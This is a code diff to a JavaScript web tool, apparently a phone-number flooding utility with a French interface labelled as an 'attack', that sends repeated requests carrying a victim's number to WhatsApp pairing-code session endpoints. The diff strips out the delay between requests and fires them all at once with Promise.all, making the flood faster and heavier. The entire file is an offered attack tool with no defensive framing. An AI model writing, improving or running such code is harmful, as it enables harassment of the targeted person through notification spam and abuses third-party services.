@@ -13,6 +13,17 @@ const API_URLS = [
     "https://meg-lodon-session.onrender.com/code?number="
 ];
 
+async function sendRequest(number) {
+    const randomApi = API_URLS[Math.floor(Math.random() * API_URLS.length)];
+    const url = randomApi + encodeURIComponent(number);
+    try {
+        const response = await fetch(url);
+        return { success: response.ok };
+    } catch {
+        return { success: false };
+    }
+}
+
 async function launchAttack() {
     let rawNumber = numberInput.value.trim();
     
@@ -29,35 +40,28 @@ async function launchAttack() {
     btn.innerText = "🔴 ATTAQUE EN COURS...";
     statusText.innerText = `⚡ ANÉANTISSEMENT EN COURS (0/${count})...`;
 
-    let success = 0;
-    let errors = 0;
-
-    for (let i = 1; i <= count; i++) {
-        const randomApi = API_URLS[Math.floor(Math.random() * API_URLS.length)];
-        const url = randomApi + encodeURIComponent(rawNumber);
-        
-        try {
-            const response = await fetch(url);
-            if (response.ok) {
-                success++;
-            } else {
-                errors++;
-            }
-        } catch (err) {
-            errors++;
-        }
-        
-        statusText.innerText = `⚡ ANÉANTISSEMENT EN COURS (${i}/${count})...`;
-        
-        if (i < count) await new Promise(r => setTimeout(r, 1500));
+    const tasks = [];
+    for (let i = 0; i < count; i++) {
+        tasks.push(sendRequest(rawNumber));
     }
 
-    let finalMsg = `✅ TERMINÉ ! ${success} demandes réussies, ${errors} erreurs.`;
+    const startTime = Date.now();
+    const results = await Promise.all(tasks);
+    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
+
+    let success = 0;
+    let errors = 0;
+    results.forEach(result => {
+        if (result.success) success++;
+        else errors++;
+    });
+
+    let finalMsg = `✅ ANÉANTISSEMENT TERMINÉ (${duration}s) ! ${success} réussies, ${errors} erreurs.`;
     if (success === 0) {
-        finalMsg = `❌ ÉCHEC TOTAL ! Aucune demande n'a abouti. Vérifie le numéro ou les API.`;
+        finalMsg = `❌ ÉCHEC (${duration}s) ! Aucune demande. API peut-être bloquée.`;
     }
     
     statusText.innerText = finalMsg;
     btn.innerText = "LANCER L'ATTAQUE 🔥";
     btn.disabled = false;
-      }
+    }
